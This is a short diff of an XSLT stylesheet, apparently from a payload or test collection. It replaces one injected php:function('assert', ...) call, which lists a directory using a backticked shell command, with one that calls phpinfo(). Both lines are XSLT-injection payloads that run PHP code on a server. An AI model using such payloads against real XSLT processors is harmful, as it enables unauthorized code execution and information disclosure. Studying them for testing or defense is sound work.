@@ -2,7 +2,7 @@
 <xsl:template match="/">
 
 
- <xsl:value-of select="php:function('assert','scandir(`pwd`)')"/>
+ <xsl:value-of select="php:function('assert','phpinfo()')"/>
 
 </xsl:template>
 </xsl:stylesheet>
